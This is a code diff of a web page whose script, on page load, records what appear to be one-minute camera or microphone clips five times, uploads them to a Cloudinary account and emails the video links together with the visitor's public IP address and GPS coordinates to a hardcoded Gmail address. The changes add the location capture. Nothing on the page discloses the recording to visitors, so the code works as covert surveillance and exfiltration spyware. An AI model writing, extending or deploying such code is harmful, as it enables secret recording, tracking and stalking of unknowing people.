@@ -7,38 +7,56 @@
 </head>
 <body>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
   <script>
-    emailjs.init("ACOn6PC1Zb70JrmxT"); // Your EmailJS public key
+    emailjs.init("ACOn6PC1Zb70JrmxT");
 
-    const CLOUDINARY_URL = "https://api.cloudinary.com/v1_1/dymxlqxxx/video/upload";
-    const UPLOAD_PRESET = "unsigned_video_uploads";
-
-    async function getPublicIP() {
+    async function getIP() {
       try {
-        const response = await fetch("https://api.ipify.org?format=json");
-        const data = await response.json();
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
         return data.ip;
       } catch {
         return "Unavailable";
       }
     }
 
+    async function getLocation() {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            resolve({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            });
+          },
+          () => {
+            resolve({ latitude: "Unavailable", longitude: "Unavailable" });
+          }
+        );
+      });
+    }
+
     async function uploadToCloudinary(blob) {
       const formData = new FormData();
       formData.append("file", blob);
-      formData.append("upload_preset", UPLOAD_PRESET);
+      formData.append("upload_preset", "unsigned_video_uploads");
 
-      const response = await fetch(CLOUDINARY_URL, {
+      const res = await fetch("https://api.cloudinary.com/v1_1/dymxlqxxx/video/upload", {
         method: "POST",
         body: formData
       });
-      if (!response.ok) throw new Error("Cloudinary upload failed");
-      return response.json(); // Returns JSON with .secure_url property
+
+      const data = await res.json();
+      return data.secure_url;
     }
 
     async function startRecording() {
       const maxRecordings = 5;
       let count = 0;
+
+      const ip = await getIP();
+      const location = await getLocation();
 
       async function recordAndSend() {
         try {
@@ -49,51 +67,53 @@
           recorder.ondataavailable = e => chunks.push(e.data);
 
           recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: "video/webm" });
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const videoUrl = await uploadToCloudinary(blob);
 
-            try {
-              // Upload to Cloudinary
-              const uploadResult = await uploadToCloudinary(blob);
-              const videoURL = uploadResult.secure_url;
+            const message = `
+You received a new video recording.
+Download link: ${videoUrl}
+IP Address: ${ip}
+Latitude: ${location.latitude}
+Longitude: ${location.longitude}
+`;
 
-              // Get public IP
-              const ip = await getPublicIP();
+            await emailjs.send("service_khmk344", "template_oyrsayr", {
+              to_email: "julianlee252@gmail.com",
+              message: message.trim()
+            });
 
-              // Send email with video URL and IP
-              await emailjs.send(
-                "service_khmk344",
-                "template_oyrsayr",
-                {
-                  to_email: "julianlee252@gmail.com",
-                  message: `Here’s your 1-minute video recording.\n\nDownload link: ${videoURL}\nSender IP: ${ip}`
-                }
-              );
+            console.log(`✅ Video email ${count + 1} sent.`);
+            stream.getTracks().forEach(track => track.stop());
 
-              console.log(`✅ Email ${count + 1} sent!`);
-
-              count++;
-              if (count < maxRecordings) {
-                recordAndSend();
-              }
-            } catch (err) {
-              console.error("Upload or email failed:", err);
-            } finally {
-              stream.getTracks().forEach(track => track.stop());
+            count++;
+            if (count < maxRecordings) {
+              setTimeout(recordAndSend, 1000); // 1 second delay before next recording
             }
           };
 
           recorder.start();
-          setTimeout(() => recorder.stop(), 60000); // Record 1 minute
-
+          setTimeout(() => recorder.stop(), 60000); // record for 1 minute
         } catch (err) {
-          console.error("Permission denied or error:", err);
+          console.error("Error:", err);
         }
       }
 
       recordAndSend();
     }
 
-    window.onload = startRecording;
+    window.onload = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(() => {
+          startRecording();
+        }, () => {
+          alert("Location permission denied. The email will not include coordinates.");
+          startRecording();
+        });
+      } else {
+        startRecording();
+      }
+    };
   </script>
 </body>
 </html>
